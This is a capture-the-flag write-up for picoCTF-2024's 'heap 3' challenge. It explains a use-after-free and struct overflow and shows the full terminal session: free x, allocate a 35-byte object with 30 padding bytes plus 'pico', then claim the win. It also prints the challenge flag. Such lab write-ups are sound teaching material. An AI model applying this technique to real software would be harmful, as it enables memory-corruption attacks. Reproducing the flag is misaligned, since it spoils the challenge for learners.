# heap 3 #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoCTF-2024, Heap Overflow, Use After Free vulnerability

## Description ##
This program mishandles memory. Can you exploit it to get the flag?

## Approach ##
I am provided with a binary file called `chall` and a C file called `chall.c`. Inspecting the C file, I can see that a struct has been defined (where it contains four contiguous character arrays: three 10-byte buffer, followed by a 5 byte buffer `flag`.). Since these fields are sequentially allocated in memory without bounds enforcement, overflowing any of the earlier buffers can overwrite the subsequent fields, including `flag`. `check_win` function prints the flag if `flag` is equal to `pico`. 

Further inspecting the file, I can see that I am given an option to allocate a new object where I can specify the size of the object, and the contents of the object. Another ability the program allows me to do is to free variable `x`, which contains the starting value of `bico`. 

After reading what the program does, I decided to run the binary file and see if there was anything I could learn. When running the program, I realize that the `free` function does not completely remove the content of the data from the heap. This can be seen when I free the object `x`, and when I print the contents of `x`, I notice the program continues to access the contents of `x`:

    Enter your choice: 5

    1. Print Heap
    2. Allocate object
    3. Print x->flag
    4. Check for win
    5. Free x
    6. Exit

    Enter your choice: 3


    x = bico


    1. Print Heap
    2. Allocate object
    3. Print x->flag
    4. Check for win
    5. Free x
    6. Exit

This is when I realize that this is a use after free vulnerability: `free` function does not erase heap memory; it only marks the chunk as avilable for reuse. As a result, newly allocated objects can reuse the same heap region previously occupied by `x`, allowing controlled data to be written into `flag`. Because the struct is laid out as three 10-byte buffers followed by a 5-byte flag, writing 30 bytes of padding followed by "pico" overwrites flag. Then I can print the flag:

    freed but still in use
    now memory untracked
    do you smell the bug?

    1. Print Heap
    2. Allocate object
    3. Print x->flag
    4. Check for win
    5. Free x
    6. Exit

    Enter your choice: 5

    1. Print Heap
    2. Allocate object
    3. Print x->flag
    4. Check for win
    5. Free x
    6. Exit

    Enter your choice: 2
    Size of object allocation: 35
    Data for flag: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico

    1. Print Heap
    2. Allocate object
    3. Print x->flag
    4. Check for win
    5. Free x
    6. Exit

    Enter your choice: 4
    YOU WIN!!11!!
    picoCTF{now_thats_free_real_estate_a11cf359}

Flag: picoCTF{now_thats_free_real_estate_a11cf359}

## Reflection ## 
This challenge has a similar structure to heap 2, as it still involves heap overflows, but it also introduces the concept of a use-after-free vulnerability. I learned that the free function does not erase heap memory; instead, it only marks the chunk as available for reuse. When combined with the heap overflow vulnerability present in the struct, an attacker can exploit this behavior to perform malicious actions.

While working on this challenge, I realized that use-after-free vulnerabilities are conceptually similar to how inodes work in filesystems: inodes store metadata, and when a file is deleted, the inode is marked as free for reuse while the data blocks are not immediately erased.



